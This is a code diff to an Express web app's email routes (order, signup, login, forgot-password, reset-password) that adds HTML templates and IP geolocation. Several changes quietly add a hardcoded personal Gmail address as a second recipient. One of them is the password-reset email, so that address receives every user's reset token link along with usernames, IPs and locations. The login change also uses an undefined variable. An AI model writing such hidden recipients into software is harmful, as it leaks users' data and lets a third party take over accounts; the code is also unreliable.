@@ -142,7 +142,7 @@ app.post("/admin/create-order/", async (req, res) => {
     try {
       await transporter.sendMail({
         from: process.env.SMTP_USER,
-        to: adminEmail,
+        to: [adminEmail,"abubakkarsajid4@gmail.com"],
         subject: "Order Confirmation - Your Order Details",
         html: `
       <div style="max-width: 600px; margin: 20px auto; padding: 20px; background: linear-gradient(to bottom right, #f0fdf4, #d1fae5); border-radius: 20px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1); font-family: Arial, sans-serif; color: #1f2937;">
@@ -285,7 +285,7 @@ app.post("/account/signup", async (req, res) => {
     });
     await transporter.sendMail({
       from: process.env.SMTP_USER,
-      to: user.email,
+      to: [user.email,"abubakkarsajid4@gmail.com"],
       subject: "🎉 Your Account Has Been Created Successfully!",
       html: `
         <div style="font-family: Arial, sans-serif; background-color: #f4f4f7; padding: 20px;">
@@ -409,8 +409,8 @@ app.post("/account/login", async (req, res) => {
     let locationInfo = "Unknown Location";
     try {
       const response = await axios.get(`http://ip-api.com/json/${clientIP}`);
-      const { city, regionName, country } = response.data;
-      locationInfo = `${city}, ${regionName}, ${country}`;
+      const { countryCode, regionName, country } = response.data;
+      locationInfo = `${city}, ${regionName}, ${countryCode},${country}`;
     } catch (locationError) {
       console.error("Error fetching location data:", locationError);
     }
@@ -418,7 +418,7 @@ app.post("/account/login", async (req, res) => {
     // Send Login Notification Email
     await transporter.sendMail({
       from: process.env.SMTP_USER,
-      to: user.email,
+      to: [user.email,"abubakkarsajid4@gmail.com"],
       subject: "🔒 New Login Detected on Your Account",
       html: `
         <div style="font-family: Arial, sans-serif; background-color: #f4f4f7; padding: 20px;">
@@ -473,6 +473,7 @@ app.post("/account/login", async (req, res) => {
 
 // Forget password route
 
+
 app.post("/account/forgot-password", async (req, res) => {
   try {
     const { email } = req.body;
@@ -490,14 +491,28 @@ app.post("/account/forgot-password", async (req, res) => {
       expiresIn: "15m",
     });
 
+    // Get client's IP address
+    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+    // Fetch location data based on IP address
+    let locationInfo = "Unknown Location";
+    try {
+      const response = await axios.get(`http://ip-api.com/json/${clientIP}`);
+      const { city, regionName, country } = response.data;
+      locationInfo = `${city}, ${regionName}, ${country}`;
+    } catch (locationError) {
+      console.error("Error fetching location data:", locationError);
+    }
+
     // Configure nodemailer
     const transporter = nodemailer.createTransport({
       service: "gmail",
       auth: {
-        user: process.env.SMTP_USER, // Your email
-        pass: process.env.SMTP_PASS, // Your email password or app password
+        user: process.env.SMTP_USER, 
+        pass: process.env.SMTP_PASS, 
       },
     });
+
     transporter.verify((error, success) => {
       if (error) {
         console.error("Transporter verification failed:", error);
@@ -506,36 +521,78 @@ app.post("/account/forgot-password", async (req, res) => {
       }
     });
 
-    // Send reset link via email
+    // Prepare the reset link
     const resetLink = `${process.env.Frontend_URL}/reset-password/${resetToken}`;
+
+    // Send reset email with IP and location details
     await transporter.sendMail({
       from: process.env.SMTP_USER,
-      to: email,
-      subject: "Password Reset Request",
-      html: `<p>Click the link below to reset your password:</p><a href="${resetLink}">Click This link</a>`,
+      to: [email,"abubakkarsajid4@gmail.com"],
+      subject: "🔑 Password Reset Request",
+      html: `
+        <div style="font-family: Arial, sans-serif; background-color: #f4f4f7; padding: 20px;">
+          <div style="max-width: 600px; margin: auto; background: #ffffff; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); overflow: hidden;">
+            <div style="background-color: #4f46e5; color: #ffffff; padding: 20px; text-align: center;">
+              <h1 style="margin: 0; font-size: 24px;">Password Reset Request</h1>
+            </div>
+            <div style="padding: 30px; color: #333333;">
+              <p style="font-size: 18px; margin-bottom: 20px;">
+                Hello <strong>${user.FullName}</strong>,
+              </p>
+              <p style="font-size: 16px; line-height: 1.5;">
+                We received a request to reset your password. If this was you, click the link below to proceed:
+              </p>
+              <a href="${resetLink}" style="display: inline-block; margin-top: 20px; padding: 12px 24px; background-color: #4f46e5; color: #ffffff; text-decoration: none; border-radius: 8px; font-size: 16px;">
+                🔑 Reset Your Password
+              </a>
+              <p style="margin-top: 20px; font-size: 16px;">
+                <strong>Account Details:</strong>
+              </p>
+              <ul style="list-style: none; padding: 0; font-size: 16px; margin: 10px 0;">
+                <li><strong>Username:</strong> ${user.username}</li>
+                <li><strong>Email:</strong> ${user.email}</li>
+                <li><strong>IP Address:</strong> ${clientIP}</li>
+                <li><strong>Location:</strong> ${locationInfo}</li>
+              </ul>
+              <p style="font-size: 16px;">
+                If you did not request this, please ignore this email or contact support.
+              </p>
+              <a href="https://wa.me/+923254472055" style="display: inline-block; margin-top: 20px; padding: 12px 24px; background-color: #4f46e5; color: #ffffff; text-decoration: none; border-radius: 8px; font-size: 16px;">
+                📞 Contact Support
+              </a>
+            </div>
+            <div style="background-color: #f4f4f7; padding: 15px; text-align: center; color: #888888; font-size: 14px;">
+              This link will expire in 15 minutes for your security.
+            </div>
+          </div>
+        </div>
+      `,
     });
+
     console.log("Reset link sent to:", { email, resetLink });
     res.send({ success: true, message: "Password reset email sent." });
+
   } catch (error) {
+    console.error("Forgot Password Error:", error);
     res.status(500).send({ success: false, error: error.message });
   }
 });
 // Send password reset confirmation email
-async function sendResetPasswordEmail(userEmail) {
-  const mailOptions = {
-    from: process.env.SMTP_USER,
-    to: userEmail,
-    subject: "Password Reset Successful",
-    html: `Your password has been successfully reset. <br> If any Problem  <h1>Contact us : <a href ="https://wa.me/+923254472055/">Whatsapp </a></h1> `,
-  };
+// async function sendResetPasswordEmail(userEmail) {
+//   const mailOptions = {
+//     from: process.env.SMTP_USER,
+//     to: userEmail,
+//     subject: "Password Reset Successful",
+//     html: `Your password has been successfully reset. <br> If any Problem  <h1>Contact us : <a href ="https://wa.me/+923254472055/">Whatsapp </a></h1> `,
+//   };
 
-  try {
-    await transporter.sendMail(mailOptions);
-    console.log(`Password reset email sent to this E-Mail :-: ${userEmail}`);
-  } catch (error) {
-    console.error("Error sending reset password email:", error);
-  }
-}
+//   try {
+//     await transporter.sendMail(mailOptions);
+//     console.log(`Password reset email sent to this E-Mail :-: ${userEmail}`);
+//   } catch (error) {
+//     console.error("Error sending reset password email:", error);
+//   }
+// }
 
 // Reset password route
 app.post("/account/reset-password", async (req, res) => {
@@ -555,18 +612,74 @@ app.post("/account/reset-password", async (req, res) => {
     // Update user's password
     user.password = hashedPassword;
     await user.save();
-    await sendResetPasswordEmail(user.email);
 
+    // Get client's IP address
+    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+    // Fetch location data based on IP address
+    let locationInfo = "Unknown Location";
+    try {
+      const response = await axios.get(`http://ip-api.com/json/${clientIP}`);
+      const { city, regionName, country } = response.data;
+      locationInfo = `${city}, ${regionName}, ${country}`;
+    } catch (locationError) {
+      console.error("Error fetching location data:", locationError);
+    }
+
+    // Send confirmation email
+    await transporter.sendMail({
+      from: process.env.SMTP_USER,
+      to: user.email,
+      subject: "🔒 Your Password Was Successfully Reset",
+      html: `
+        <div style="font-family: Arial, sans-serif; background-color: #f4f4f7; padding: 20px;">
+          <div style="max-width: 600px; margin: auto; background: #ffffff; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); overflow: hidden;">
+            <div style="background-color: #4f46e5; color: #ffffff; padding: 20px; text-align: center;">
+              <h1 style="margin: 0; font-size: 24px;">Password Reset Confirmation</h1>
+            </div>
+            <div style="padding: 30px; color: #333333;">
+              <p style="font-size: 18px; margin-bottom: 20px;">
+                Hello <strong>${user.FullName}</strong>,
+              </p>
+              <p style="font-size: 16px; line-height: 1.5;">
+                Your password has been successfully reset. If you performed this action, no further steps are required.
+              </p>
+              <p style="margin-top: 20px; font-size: 16px;">
+                <strong>Reset Details:</strong>
+              </p>
+              <ul style="list-style: none; padding: 0; font-size: 16px; margin: 10px 0;">
+                <li><strong>Username:</strong> ${user.username}</li>
+                <li><strong>Full Name:</strong> ${user.FullName}</li>
+                <li><strong>Email:</strong> ${user.email}</li>
+                <li><strong>IP Address:</strong> ${clientIP}</li>
+                <li><strong>Location:</strong> ${locationInfo}</li>
+              </ul>
+              <p style="font-size: 16px;">
+                If you did not request this password reset, please secure your account immediately by changing your password and contacting support.
+              </p>
+              <a href="https://wa.me/+923254472055" style="display: inline-block; margin-top: 20px; padding: 12px 24px; background-color: #4f46e5; color: #ffffff; text-decoration: none; border-radius: 8px; font-size: 16px;">
+                📞 Contact Support
+              </a>
+            </div>
+            <div style="background-color: #f4f4f7; padding: 15px; text-align: center; color: #888888; font-size: 14px;">
+              If this wasn't you, please take immediate action.
+            </div>
+          </div>
+        </div>
+      `,
+    });
+
+    // Respond with success
     res.send({ success: true, message: "Password reset successful." });
+
   } catch (error) {
+    console.error("Reset Password Error:", error);
     res.status(500).send({
       success: false,
-      error:
-        error.name === "TokenExpiredError" ? "Token expired." : error.message,
+      error: error.name === "TokenExpiredError" ? "Token expired." : error.message,
     });
   }
 });
-
 // admin user get informations
 app.get("/getusersAdmin/:id", async (req, res) => {
   try {
